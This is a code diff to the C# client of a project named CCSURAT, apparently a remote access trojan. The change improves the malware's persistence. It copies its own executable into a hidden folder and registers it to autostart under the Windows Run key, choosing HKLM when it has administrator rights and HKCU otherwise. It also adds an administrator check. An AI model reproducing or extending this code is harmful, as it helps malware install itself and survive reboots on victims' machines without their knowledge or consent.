@@ -8,6 +8,7 @@ using System.Threading;
 using System.Diagnostics;
 using System.Net;
 using System.IO;
+using System.Security.Principal;
 
 namespace CCSURAT_Client
 {
@@ -278,8 +279,15 @@ namespace CCSURAT_Client
                         File.Delete(path + @"\" + folderName + "\\" + fileName + ".exe");
                     File.Copy(Application.ExecutablePath, path + @"\" + folderName + "\\" + fileName + ".exe");
 
-                    RegistryKey autoRunReg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    autoRunReg.SetValue(fileName, path + @"\" + folderName + "\\" + fileName + ".exe");
+
+                    if(IsAdministrator()) { 
+                        RegistryKey autoRunReg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        autoRunReg.SetValue(fileName, "\"" + path + @"\" + folderName + "\\" + fileName + ".exe\"");
+                    } 
+                    else { 
+                        RegistryKey autoRunReg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        autoRunReg.SetValue(fileName, "\"" + path + @"\" + folderName + "\\" + fileName + ".exe\"");
+                    }
 
                     Process newProc = new Process();
                     newProc.StartInfo.FileName = path + @"\" + folderName + "\\" + fileName + ".exe";
@@ -296,6 +304,12 @@ namespace CCSURAT_Client
             {
                 return true;
             }
+        }
+
+        public static bool IsAdministrator()
+        {
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
+                    .IsInRole(WindowsBuiltInRole.Administrator);
         }
         #endregion
 
